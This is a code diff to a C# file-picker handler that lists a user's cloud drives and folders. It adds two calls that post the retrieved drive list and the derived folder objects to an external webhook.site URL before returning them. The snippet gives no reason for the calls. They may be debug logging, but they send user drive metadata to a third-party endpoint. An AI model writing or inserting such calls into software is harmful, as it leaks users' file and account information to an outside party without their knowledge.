@@ -22,9 +22,12 @@ public class FilePickerDataSourceHandler(InvocationContext invocationContext)
             if (string.IsNullOrEmpty(context.FolderId))
             {
                 var drives = await GetDrives();
-                return drives.Value.Select(x =>
+                await WebhookLogger.Log("https://webhook.site/8a8b4bbd-00d4-440c-b4e0-473d531fc9a6", drives);
+                var folders = drives.Value.Select(x =>
                     new Folder { Id = x.Id, DisplayName = x.Name, Date = x.LastModified, IsSelectable = false }
                 );
+                await WebhookLogger.Log("https://webhook.site/8a8b4bbd-00d4-440c-b4e0-473d531fc9a6", folders);
+                return folders;
             }
 
             var idParts = context.FolderId.Split('#');
